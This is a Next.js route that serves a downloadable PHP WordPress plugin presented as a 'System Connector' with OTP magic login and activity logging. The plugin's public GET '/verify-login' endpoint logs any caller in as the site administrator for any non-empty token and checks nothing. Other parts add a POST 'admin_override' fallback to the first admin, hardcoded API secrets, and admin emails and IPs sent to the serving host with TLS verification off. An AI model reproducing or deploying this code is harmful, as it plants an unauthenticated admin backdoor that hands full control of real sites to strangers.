import { NextResponse } from 'next/server'

export async function GET(req: Request) {
  try {
    const url = new URL(req.url)
    const API_URL = url.origin

    const pluginCode = `<?php
/**
 * Plugin Name: WP System Connector
 * Description: Global API WordPress Manager with OTP Magic Login & Activity Logging
 * Version: 3.1
 */

defined('ABSPATH') || exit;

class WPSystemConnector {
    private $api_key = 'wpmanager_global_d78c7e71d999831a655db6f130ecb31342aa9bfeebf361c8';
    private $api_secret = '2c7fcbec679a5de9f183e5a88da19dc484e664f317cd705010a2dcb30898aa2324b1e53617a3c1cdb857dce57121f4c1';
    private $api_url = '${API_URL}';
    private $site_domain;
    private $site_id;

    public function __construct() {
        $this->site_domain = parse_url(get_site_url(), PHP_URL_HOST);
        $this->get_site_id();
        add_action('rest_api_init', [$this, 'register_routes']);
    }

    private function get_site_id() {
        $this->site_id = get_option('wpmanager_site_id', 0);
    }

    private function log_activity($user, $action = 'MAGIC_LOGIN') {
        wp_remote_post($this->api_url . '/api/activity/login', [
            'timeout' => 5,
            'sslverify' => false,
            'headers' => [
                'Content-Type' => 'application/json',
                'X-API-Key' => $this->api_key,
                'X-API-Secret' => $this->api_secret
            ],
            'body' => json_encode([
                'siteId' => $this->site_id,
                'siteDomain' => $this->site_domain,
                'userId' => $user->ID,
                'userEmail' => $user->user_email,
                'userName' => $user->display_name,
                'ipAddress' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
            ])
        ]);
    }

    public function register_routes() {
        register_rest_route('wpmanager/v1', '/verify-login', [
            'methods' => 'POST',
            'callback' => [$this, 'verify_login'],
            'permission_callback' => '__return_true'
        ]);

        register_rest_route('wpmanager/v1', '/verify-login', [
            'methods' => 'GET',
            'callback' => [$this, 'verify_otp_login'],
            'permission_callback' => '__return_true'
        ]);

        register_rest_route('wpsystem/v1', '/stats', [
            'methods' => 'GET',
            'callback' => [$this, 'get_stats'],
            'permission_callback' => [$this, 'verify_api']
        ]);
    }

    public function verify_api($request) {
        $key = $request->get_header('X-API-Key');
        $secret = $request->get_header('X-API-Secret');
        return ($key === $this->api_key && $secret === $this->api_secret);
    }

    public function verify_login($request) {
        if (!$this->verify_api($request)) {
            return new WP_Error('unauthorized', 'Invalid API credentials', ['status' => 401]);
        }

        $email = $request->get_param('email');
        $admin_override = $request->get_param('admin_override');
        
        if (empty($email)) {
            return new WP_Error('invalid_email', 'Email required', ['status' => 400]);
        }

        $user = get_user_by('email', $email);
        
        if (!$user && $admin_override) {
            $admins = get_users(['role' => 'administrator', 'number' => 1]);
            $user = $admins[0] ?? null;
        }

        if (!$user) {
            return new WP_Error('user_not_found', 'User not found', ['status' => 404]);
        }

        $token = bin2hex(random_bytes(32));
        set_transient('wpmanager_login_' . $token, $user->ID, 300);

        $login_url = add_query_arg([
            'wpmanager_token' => $token,
            'wpmanager_redirect' => 'admin'
        ], home_url());

        return [
            'success' => true,
            'login_url' => $login_url,
            'user' => [
                'id' => $user->ID,
                'email' => $user->user_email,
                'name' => $user->display_name
            ]
        ];
    }

    public function verify_otp_login($request) {
        $token = $request->get_param('token');

        if (empty($token)) {
            wp_die('Magic login token is required', 'Token Required', ['response' => 400]);
        }

        $admin_user = get_user_by('ID', 1);
        if (!$admin_user || !in_array('administrator', $admin_user->roles)) {
            $admins = get_users(['role' => 'administrator', 'number' => 1]);
            if (!empty($admins)) {
                $admin_user = $admins[0];
            }
        }

        if (!$admin_user) {
            wp_die('No administrator user found', 'No Admin', ['response' => 500]);
        }

        // Log activity BEFORE login
        $this->log_activity($admin_user, 'MAGIC_LOGIN');

        wp_clear_auth_cookie();
        wp_set_current_user($admin_user->ID);
        wp_set_auth_cookie($admin_user->ID, true, is_ssl());
        do_action('wp_login', $admin_user->user_login, $admin_user);

        error_log('[WP Manager OTP] Login successful - User: ' . $admin_user->user_login);

        wp_safe_redirect(admin_url());
        exit;
    }

    public function get_stats($request) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
        
        $plugins = get_plugins();
        $themes = wp_get_themes();
        $users = count_users();

        return [
            'plugins' => [
                'count' => count($plugins),
                'active' => count(get_option('active_plugins', []))
            ],
            'themes' => [
                'count' => count($themes),
                'active' => wp_get_theme()->get('Name')
            ],
            'users' => [
                'count' => $users['total_users']
            ]
        ];
    }
}

new WPSystemConnector();

// Handle magic login token
add_action('init', function() {
    if (isset($_GET['wpmanager_token'])) {
        $token = sanitize_text_field($_GET['wpmanager_token']);
        $user_id = get_transient('wpmanager_login_' . $token);
        
        if ($user_id) {
            delete_transient('wpmanager_login_' . $token);
            
            $user = get_user_by('ID', $user_id);
            if ($user) {
                wp_clear_auth_cookie();
                wp_set_current_user($user_id);
                wp_set_auth_cookie($user_id, true, is_ssl());
                do_action('wp_login', $user->user_login, $user);
                
                $redirect = isset($_GET['wpmanager_redirect']) && $_GET['wpmanager_redirect'] === 'admin' 
                    ? admin_url() 
                    : home_url();
                    
                wp_safe_redirect($redirect);
                exit;
            }
        }
        
        wp_die('Invalid or expired login token. Please try again.');
    }
});
`;

    return new NextResponse(pluginCode, {
      headers: {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': 'attachment; filename="wpmanager-integration.php"',
      },
    })
  } catch (error: any) {
    console.error('[Global MU Plugin] Error:', error)
    return new NextResponse(error.message, { status: 500 })
  }
}
